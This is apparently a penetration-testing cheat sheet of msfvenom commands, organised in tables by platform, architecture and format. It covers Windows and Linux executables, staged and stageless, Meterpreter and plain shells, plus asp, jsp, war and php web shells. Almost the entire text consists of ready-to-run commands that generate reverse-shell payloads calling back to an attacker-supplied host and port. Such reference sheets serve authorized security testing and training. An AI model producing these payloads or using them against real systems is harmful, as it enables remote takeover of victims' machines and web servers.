### **COMMON MISTAKES TO AVOID**

1.  Mismatched payloads
2.  Trying to catch a staged shell without using the multi/handler
3.  Architecture mismatch
4.  32-bit payloads don’t contain the architecture in the naming convention, but 64 bit payloads do (as shown below).

### **METERPRETER BINARIES**

#### Staged Payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Stageless Payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/meterpreter_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=[PORT] -f exe > shell-x64.exe` |

#### Staged Payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Stageless Payloads for Linux 

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Meterpreter Web Payloads

| FORMAT | Command |
| --- | --- |
| asp | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f asp > shell.asp` |
| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f raw > example.jsp` |
| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f war > example.war` |
| php | `msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f raw > shell.php` |

### **NON-METERPRETER BINARIES**

#### Staged Payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/shell/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Stageless Payloads for Windows

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f exe > shell-x64.exe` |

#### Staged Payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Stageless Payloads for Linux

| Architecture | Command |
| --- | --- |
| x86 | `msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f elf > shell-x64.elf` |

#### Non-Meterpreter Web Payloads

| Format | Command |
| --- | --- |
| asp | `msfvenom -p windows/shell/reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f asp > shell.asp` |
| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f raw > shell.jsp` |
| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=[PORT] -f war > shell.war` |
| php | `msfvenom -p php/reverse_php LHOST=[IP-ADRESS] LPORT=[PORT] -f raw > shell.php` |